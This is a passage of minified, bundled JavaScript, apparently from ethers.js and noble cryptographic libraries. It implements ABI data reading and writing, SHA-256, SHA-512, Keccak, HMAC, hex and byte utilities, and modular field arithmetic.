h=c[l];if(h instanceof Function)return function(...m){return h.apply(this===f?c:this,m)};if(!(l in c))return c.getValue.apply(this===f?c:this,[l])}return Reflect.get(c,l,f)}});return iG(a,Nm(this)),a}toArray(e){const n=[];return this.forEach((r,i)=>{r instanceof Error&&Uv(`index ${i}`,r),e&&r instanceof wf&&(r=r.toArray(e)),n.push(r)}),n}toObject(e){const n=Nm(this);return n.reduce((r,i,s)=>(qe(i!=null,`value at index ${s} unnamed`,"UNSUPPORTED_OPERATION",{operation:"toObject()"}),oD(n,this,e)),{})}slice(e,n){e==null&&(e=0),e<0&&(e+=this.length,e<0&&(e=0)),n==null&&(n=this.length),n<0&&(n+=this.length,n<0&&(n=0)),n>this.length&&(n=this.length);const r=Nm(this),i=[],s=[];for(let o=e;o<n;o++)i.push(this[o]),s.push(r[o]);return new wf(a6,i,s)}filter(e,n){const r=Nm(this),i=[],s=[];for(let o=0;o<this.length;o++){const a=this[o];a instanceof Error&&Uv(`index ${o}`,a),e.call(n,a,o,this)&&(i.push(a),s.push(r[o]))}return new wf(a6,i,s)}map(e,n){const r=[];for(let i=0;i<this.length;i++){const s=this[i];s instanceof Error&&Uv(`index ${i}`,s),r.push(e.call(n,s,i,this))}return r}getValue(e){const n=Nm(this).indexOf(e);if(n===-1)return;const r=this[n];return r instanceof Error&&Uv(`property ${JSON.stringify(e)}`,r.error),r}static fromItems(e,n){return new wf(a6,e,n)}}function sG(t){let e=Di(t);return qe(e.length<=mo,"value out-of-bounds","BUFFER_OVERRUN",{buffer:e,length:mo,offset:e.length}),e.length!==mo&&(e=po(Lr([sD.slice(e.length%mo),e]))),e}class Kf{name;type;localName;dynamic;constructor(e,n,r,i){Lt(this,{name:e,type:n,localName:r,dynamic:i},{name:"string",type:"string",localName:"string",dynamic:"boolean"})}_throwError(e,n){pe(!1,e,this.localName,n)}}class aD{#e;#t;constructor(){this.#e=[],this.#t=0}get data(){return Lr(this.#e)}get length(){return this.#t}#n(e){return this.#e.push(e),this.#t+=e.length,e.length}appendWriter(e){return this.#n(po(e.data))}writeBytes(e){let n=po(e);const r=n.length%mo;return r&&(n=po(Lr([n,sD.slice(r)]))),this.#n(n)}writeValue(e){return this.#n(sG(e))}writeUpdatableValue(){const e=this.#e.length;return this.#e.push(sD),this.#t+=mo,n=>{this.#e[e]=sG(n)}}}class mj{allowLoose;#e;#t;#n;#r;#i;constructor(e,n,r){Lt(this,{allowLoose:!!n}),this.#e=po(e),this.#n=0,this.#r=null,this.#i=r??1024,this.#t=0}get data(){return rt(this.#e)}get dataLength(){return this.#e.length}get consumed(){return this.#t}get bytes(){return new Uint8Array(this.#e)}#o(e){if(this.#r)return this.#r.#o(e);this.#n+=e,qe(this.#i<1||this.#n<=this.#i*this.dataLength,`compressed ABI data exceeds inflation ratio of ${this.#i} ( see: https://github.com/ethers-io/ethers.js/issues/4537 )`,"BUFFER_OVERRUN",{buffer:po(this.#e),offset:this.#t,length:e,info:{bytesRead:this.#n,dataLength:this.dataLength}})}#s(e,n,r){let i=Math.ceil(n/mo)*mo;return this.#t+i>this.#e.length&&(this.allowLoose&&r&&this.#t+n<=this.#e.length?i=n:qe(!1,"data out-of-bounds","BUFFER_OVERRUN",{buffer:po(this.#e),length:this.#e.length,offset:this.#t+i})),this.#e.slice(this.#t,this.#t+i)}subReader(e){const n=new mj(this.#e.slice(this.#t+e),this.allowLoose,this.#i);return n.#r=this,n}readBytes(e,n){let r=this.#s(0,e,!!n);return this.#o(e),this.#t+=r.length,r.slice(0,e)}readValue(){return E8(this.readBytes(mo))}readIndex(){return vBe(this.readBytes(mo))}}function dI(t){if(!Number.isSafeInteger(t)||t<0)throw new Error(`Wrong positive integer: ${t}`)}function gj(t,...e){if(!(t instanceof Uint8Array))throw new Error("Expected Uint8Array");if(e.length>0&&!e.includes(t.length))throw new Error(`Expected Uint8Array of length ${e}, not of length=${t.length}`)}function HBe(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");dI(t.outputLen),dI(t.blockLen)}function F1(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Ece(t,e){gj(t);const n=e.outputLen;if(t.length<n)throw new Error(`digestInto() expects output buffer of length at least ${n}`)}const EO=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;const _ce=t=>t instanceof Uint8Array,zBe=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),_O=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),Cl=(t,e)=>t<<32-e|t>>>e,qBe=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!qBe)throw new Error("Non little-endian hardware is not supported");function VBe(t){if(typeof t!="string")throw new Error(`utf8ToBytes expected string, got ${typeof t}`);return new Uint8Array(new TextEncoder().encode(t))}function _8(t){if(typeof t=="string"&&(t=VBe(t)),!_ce(t))throw new Error(`expected Uint8Array, got ${typeof t}`);return t}function WBe(...t){const e=new Uint8Array(t.reduce((r,i)=>r+i.length,0));let n=0;return t.forEach(r=>{if(!_ce(r))throw new Error("Uint8Array expected");e.set(r,n),n+=r.length}),e}let yj=class{clone(){return this._cloneInto()}};function bj(t){const e=r=>t().update(_8(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function GBe(t=32){if(EO&&typeof EO.getRandomValues=="function")return EO.getRandomValues(new Uint8Array(t));throw new Error("crypto.getRandomValues must be defined")}class Ace extends yj{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,HBe(e);const r=_8(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return F1(this),this.iHash.update(e),this}digestInto(e){F1(this),gj(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const Cce=(t,e,n)=>new Ace(t,e).update(n).digest();Cce.create=(t,e)=>new Ace(t,e);function KBe(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}class Sce extends yj{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=_O(this.buffer)}update(e){F1(this);const{view:n,buffer:r,blockLen:i}=this;e=_8(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=_O(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){F1(this),Ece(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;KBe(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=_O(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,f=this.get();if(l>f.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,f[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%n&&e.buffer.set(r),e}}const ZBe=(t,e,n)=>t&e^~t&n,YBe=(t,e,n)=>t&e^t&n^e&n,QBe=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Zh=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Yh=new Uint32Array(64);class JBe extends Sce{constructor(){super(64,32,8,!1),this.A=Zh[0]|0,this.B=Zh[1]|0,this.C=Zh[2]|0,this.D=Zh[3]|0,this.E=Zh[4]|0,this.F=Zh[5]|0,this.G=Zh[6]|0,this.H=Zh[7]|0}get(){const{A:e,B:n,C:r,D:i,E:s,F:o,G:a,H:c}=this;return[e,n,r,i,s,o,a,c]}set(e,n,r,i,s,o,a,c){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,n){for(let h=0;h<16;h++,n+=4)Yh[h]=e.getUint32(n,!1);for(let h=16;h<64;h++){const m=Yh[h-15],b=Yh[h-2],w=Cl(m,7)^Cl(m,18)^m>>>3,y=Cl(b,17)^Cl(b,19)^b>>>10;Yh[h]=y+Yh[h-7]+w+Yh[h-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:c,G:l,H:f}=this;for(let h=0;h<64;h++){const m=Cl(a,6)^Cl(a,11)^Cl(a,25),b=f+m+ZBe(a,c,l)+QBe[h]+Yh[h]|0,y=(Cl(r,2)^Cl(r,13)^Cl(r,22))+YBe(r,i,s)|0;f=l,l=c,c=a,a=o+b|0,o=s,s=i,i=r,r=b+y|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,f=f+this.H|0,this.set(r,i,s,o,a,c,l,f)}roundClean(){Yh.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const Tce=bj(()=>new JBe),c6=BigInt(2**32-1),cD=BigInt(32);function xce(t,e=!1){return e?{h:Number(t&c6),l:Number(t>>cD&c6)}:{h:Number(t>>cD&c6)|0,l:Number(t&c6)|0}}function Ice(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=xce(t[i],e);[n[i],r[i]]=[s,o]}return[n,r]}const XBe=(t,e)=>BigInt(t>>>0)<<cD|BigInt(e>>>0),eje=(t,e,n)=>t>>>n,tje=(t,e,n)=>t<<32-n|e>>>n,nje=(t,e,n)=>t>>>n|e<<32-n,rje=(t,e,n)=>t<<32-n|e>>>n,ije=(t,e,n)=>t<<64-n|e>>>n-32,sje=(t,e,n)=>t>>>n-32|e<<64-n,oje=(t,e)=>e,aje=(t,e)=>t,Rce=(t,e,n)=>t<<n|e>>>32-n,Pce=(t,e,n)=>e<<n|t>>>32-n,Nce=(t,e,n)=>e<<n-32|t>>>64-n,Oce=(t,e,n)=>t<<n-32|e>>>64-n;function cje(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const uje=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),lje=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,dje=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),fje=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,hje=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),pje=(t,e,n,r,i,s)=>e+n+r+i+s+(t/2**32|0)|0,nn={fromBig:xce,split:Ice,toBig:XBe,shrSH:eje,shrSL:tje,rotrSH:nje,rotrSL:rje,rotrBH:ije,rotrBL:sje,rotr32H:oje,rotr32L:aje,rotlSH:Rce,rotlSL:Pce,rotlBH:Nce,rotlBL:Oce,add:cje,add3L:uje,add3H:lje,add4L:dje,add4H:fje,add5H:pje,add5L:hje},[mje,gje]=nn.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),Qh=new Uint32Array(80),Jh=new Uint32Array(80);class yje extends Sce{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:f,Fh:h,Fl:m,Gh:b,Gl:w,Hh:y,Hl:E}=this;return[e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E]}set(e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=f|0,this.Fh=h|0,this.Fl=m|0,this.Gh=b|0,this.Gl=w|0,this.Hh=y|0,this.Hl=E|0}process(e,n){for(let S=0;S<16;S++,n+=4)Qh[S]=e.getUint32(n),Jh[S]=e.getUint32(n+=4);for(let S=16;S<80;S++){const v=Qh[S-15]|0,k=Jh[S-15]|0,O=nn.rotrSH(v,k,1)^nn.rotrSH(v,k,8)^nn.shrSH(v,k,7),_=nn.rotrSL(v,k,1)^nn.rotrSL(v,k,8)^nn.shrSL(v,k,7),I=Qh[S-2]|0,T=Jh[S-2]|0,B=nn.rotrSH(I,T,19)^nn.rotrBH(I,T,61)^nn.shrSH(I,T,6),U=nn.rotrSL(I,T,19)^nn.rotrBL(I,T,61)^nn.shrSL(I,T,6),M=nn.add4L(_,U,Jh[S-7],Jh[S-16]),N=nn.add4H(M,O,B,Qh[S-7],Qh[S-16]);Qh[S]=N|0,Jh[S]=M|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:f,Eh:h,El:m,Fh:b,Fl:w,Gh:y,Gl:E,Hh:A,Hl:R}=this;for(let S=0;S<80;S++){const v=nn.rotrSH(h,m,14)^nn.rotrSH(h,m,18)^nn.rotrBH(h,m,41),k=nn.rotrSL(h,m,14)^nn.rotrSL(h,m,18)^nn.rotrBL(h,m,41),O=h&b^~h&y,_=m&w^~m&E,I=nn.add5L(R,k,_,gje[S],Jh[S]),T=nn.add5H(I,A,v,O,mje[S],Qh[S]),B=I|0,U=nn.rotrSH(r,i,28)^nn.rotrBH(r,i,34)^nn.rotrBH(r,i,39),M=nn.rotrSL(r,i,28)^nn.rotrBL(r,i,34)^nn.rotrBL(r,i,39),N=r&s^r&a^s&a,q=i&o^i&c^o&c;A=y|0,R=E|0,y=b|0,E=w|0,b=h|0,w=m|0,{h,l:m}=nn.add(l|0,f|0,T|0,B|0),l=a|0,f=c|0,a=s|0,c=o|0,s=r|0,o=i|0;const P=nn.add3L(B,M,q);r=nn.add3H(P,T,U,N),i=P|0}({h:r,l:i}=nn.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=nn.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=nn.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:f}=nn.add(this.Dh|0,this.Dl|0,l|0,f|0),{h,l:m}=nn.add(this.Eh|0,this.El|0,h|0,m|0),{h:b,l:w}=nn.add(this.Fh|0,this.Fl|0,b|0,w|0),{h:y,l:E}=nn.add(this.Gh|0,this.Gl|0,y|0,E|0),{h:A,l:R}=nn.add(this.Hh|0,this.Hl|0,A|0,R|0),this.set(r,i,s,o,a,c,l,f,h,m,b,w,y,E,A,R)}roundClean(){Qh.fill(0),Jh.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const bje=bj(()=>new yje);function wje(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")}const oG=wje();oG.crypto||oG.msCrypto;function vje(t){switch(t){case"sha256":return Tce.create();case"sha512":return bje.create()}pe(!1,"invalid hashing algorithm name","algorithm",t)}const[kce,Dce,Bce]=[[],[],[]],Eje=BigInt(0),Lv=BigInt(1),_je=BigInt(2),Aje=BigInt(7),Cje=BigInt(256),Sje=BigInt(113);for(let t=0,e=Lv,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],kce.push(2*(5*r+n)),Dce.push((t+1)*(t+2)/2%64);let i=Eje;for(let s=0;s<7;s++)e=(e<<Lv^(e>>Aje)*Sje)%Cje,e&_je&&(i^=Lv<<(Lv<<BigInt(s))-Lv);Bce.push(i)}const[Tje,xje]=Ice(Bce,!0),aG=(t,e,n)=>n>32?Nce(t,e,n):Rce(t,e,n),cG=(t,e,n)=>n>32?Oce(t,e,n):Pce(t,e,n);function Ije(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let o=0;o<10;o++)n[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=n[c],f=n[c+1],h=aG(l,f,1)^n[a],m=cG(l,f,1)^n[a+1];for(let b=0;b<50;b+=10)t[o+b]^=h,t[o+b+1]^=m}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Dce[o],c=aG(i,s,a),l=cG(i,s,a),f=kce[o];i=t[f],s=t[f+1],t[f]=c,t[f+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)n[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~n[(a+2)%10]&n[(a+4)%10]}t[0]^=Tje[r],t[1]^=xje[r]}n.fill(0)}class wj extends yj{constructor(e,n,r,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,dI(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=zBe(this.state)}keccak(){Ije(this.state32,this.rounds),this.posOut=0,this.pos=0}update(e){F1(this);const{blockLen:n,state:r}=this;e=_8(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);for(let a=0;a<o;a++)r[this.pos++]^=e[s++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){F1(this,!1),gj(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,s=e.length;i<s;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,s-i);e.set(n.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return dI(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Ece(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new wj(n,r,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=r,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}}const Rje=(t,e,n)=>bj(()=>new wj(e,t,n)),Pje=Rje(1,136,256/8);let jce=!1;const Mce=function(t){return Pje(t)};let Uce=Mce;function Oi(t){const e=an(t,"data");return rt(Uce(e))}Oi._=Mce;Oi.lock=function(){jce=!0};Oi.register=function(t){if(jce)throw new TypeError("keccak256 is locked");Uce=t};Object.freeze(Oi);const Lce=function(t){return vje("sha256").update(t).digest()};let Fce=Lce,$ce=!1;function hw(t){const e=an(t,"data");return rt(Fce(e))}hw._=Lce;hw.lock=function(){$ce=!0};hw.register=function(t){if($ce)throw new Error("sha256 is locked");Fce=t};Object.freeze(hw);Object.freeze(hw);const Hce=BigInt(0),A8=BigInt(1),Nje=BigInt(2),C8=t=>t instanceof Uint8Array,Oje=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function $1(t){if(!C8(t))throw new Error("Uint8Array expected");let e="";for(let n=0;n<t.length;n++)e+=Oje[t[n]];return e}function zce(t){const e=t.toString(16);return e.length&1?`0${e}`:e}function vj(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return BigInt(t===""?"0":`0x${t}`)}function H1(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length;if(e%2)throw new Error("padded hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(e/2);for(let r=0;r<n.length;r++){const i=r*2,s=t.slice(i,i+2),o=Number.parseInt(s,16);if(Number.isNaN(o)||o<0)throw new Error("Invalid byte sequence");n[r]=o}return n}function Jm(t){return vj($1(t))}function Ej(t){if(!C8(t))throw new Error("Uint8Array expected");return vj($1(Uint8Array.from(t).reverse()))}function z1(t,e){return H1(t.toString(16).padStart(e*2,"0"))}function _j(t,e){return z1(t,e).reverse()}function kje(t){return H1(zce(t))}function Tu(t,e,n){let r;if(typeof e=="string")try{r=H1(e)}catch(s){throw new Error(`${t} must be valid hex string, got "${e}". Cause: ${s}`)}else if(C8(e))r=Uint8Array.from(e);else throw new Error(`${t} must be hex string or Uint8Array`);const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(`${t} expected ${n} bytes, got ${i}`);return r}function T_(...t){const e=new Uint8Array(t.reduce((r,i)=>r+i.length,0));let n=0;return t.forEach(r=>{if(!C8(r))throw new Error("Uint8Array expected");e.set(r,n),n+=r.length}),e}function Dje(t,e){if(t.length!==e.length)return!1;for(let n=0;n<t.length;n++)if(t[n]!==e[n])return!1;return!0}function Bje(t){if(typeof t!="string")throw new Error(`utf8ToBytes expected string, got ${typeof t}`);return new Uint8Array(new TextEncoder().encode(t))}function jje(t){let e;for(e=0;t>Hce;t>>=A8,e+=1);return e}function Mje(t,e){return t>>BigInt(e)&A8}const Uje=(t,e,n)=>t|(n?A8:Hce)<<BigInt(e),Aj=t=>(Nje<<BigInt(t-1))-A8,AO=t=>new Uint8Array(t),uG=t=>Uint8Array.from(t);function qce(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");let r=AO(t),i=AO(t),s=0;const o=()=>{r.fill(1),i.fill(0),s=0},a=(...h)=>n(i,r,...h),c=(h=AO())=>{i=a(uG([0]),h),r=a(),h.length!==0&&(i=a(uG([1]),h),r=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let h=0;const m=[];for(;h<e;){r=a();const b=r.slice();m.push(b),h+=r.length}return T_(...m)};return(h,m)=>{o(),c(h);let b;for(;!(b=m(l()));)c();return o(),b}}const Lje={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||t instanceof Uint8Array,isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function IA(t,e,n={}){const r=(i,s,o)=>{const a=Lje[s];if(typeof a!="function")throw new Error(`Invalid validator "${s}", expected function`);const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error(`Invalid param ${String(i)}=${c} (${typeof c}), expected ${s}`)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(n))r(i,s,!0);return t}const Fje=Object.freeze(Object.defineProperty({__proto__:null,bitGet:Mje,bitLen:jje,bitMask:Aj,bitSet:Uje,bytesToHex:$1,bytesToNumberBE:Jm,bytesToNumberLE:Ej,concatBytes:T_,createHmacDrbg:qce,ensureBytes:Tu,equalBytes:Dje,hexToBytes:H1,hexToNumber:vj,numberToBytesBE:z1,numberToBytesLE:_j,numberToHexUnpadded:zce,numberToVarBytesBE:kje,utf8ToBytes:Bje,validateObject:IA},Symbol.toStringTag,{value:"Module"}));const rs=BigInt(0),wi=BigInt(1),Om=BigInt(2),$je=BigInt(3),uD=BigInt(4),lG=BigInt(5),dG=BigInt(8);BigInt(9);BigInt(16);function Qo(t,e){const n=t%e;return n>=rs?n:e+n}function Hje(t,e,n){if(n<=rs||e<rs)throw new Error("Expected power/modulo > 0");if(n===wi)return rs;let r=wi;for(;e>rs;)e&wi&&(r=r*t%n),t=t*t%n,e>>=wi;return r}function Sc(t,e,n){let r=t;for(;e-- >rs;)r*=r,r%=n;return r}function lD(t,e){if(t===rs||e<=rs)throw new Error(`invert: expected positive integers, got n=${t} mod=${e}`);let n=Qo(t,e),r=e,i=rs,s=wi;for(;n!==rs;){const a=r/n,c=r%n,l=i-s*a;r=n,n=c,i=s,s=l}if(r!==wi)throw new Error("invert: does not exist");return Qo(i,e)}function zje(t){const e=(t-wi)/Om;let n,r,i;for(n=t-wi,r=0;n%Om===rs;n/=Om,r++);for(i=Om;i<t&&Hje(i,e,t)!==t-wi;i++);if(r===1){const o=(t+wi)/uD;return function(c,l){const f=c.pow(l,o);if(!c.eql(c.sqr(f),l))throw new Error("Cannot find square root");return f}}const s=(n+wi)/Om;return function(a,c){if(a.pow(c,e)===a.neg(a.ONE))throw new Error("Cannot find square root");let l=r,f=a.pow(a.mul(a.ONE,i),n),h=a.pow(c,s),m=a.pow(c,n);for(;!a.eql(m,a.ONE);){if(a.eql(m,a.ZERO))return a.ZERO;let b=1;for(let y=a.sqr(m);b<l&&!a.eql(y,a.ONE);b++)y=a.sqr(y);const w=a.pow(f,wi<<BigInt(l-b-1));f=a.sqr(w),h=a.mul(h,w),m=a.mul(m,f),l=b}return h}}function qje(t){if(t%uD===$je){const e=(t+wi)/uD;return function(r,i){const s=r.pow(i,e);if(!r.eql(r.sqr(s),i))throw new Error("Cannot find square root");return s}}if(t%dG===lG){const e=(t-lG)/dG;return function(r,i){const s=r.mul(i,Om),o=r.pow(s,e),a=r.mul(i,o),c=r.mul(r.mul(a,Om),o),l=r.mul(a,r.sub(c,r.ONE));if(!r.eql(r.sqr(l),i))throw new Error("Cannot find square root");return l}}return 